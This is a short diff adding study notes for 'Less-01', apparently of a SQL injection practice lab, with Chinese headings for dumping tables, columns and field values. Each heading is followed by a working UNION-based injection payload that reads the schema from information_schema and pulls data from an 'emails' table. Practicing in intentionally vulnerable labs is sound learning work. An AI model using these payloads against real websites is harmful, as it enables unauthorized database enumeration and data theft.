@@ -1,0 +1,7 @@
+Less-01
+爆表
+?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+
+爆列
+?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='emails'--+
+爆字段值
+?id=-1' union select 1,group_concat(email_id),3 from security.emails--+
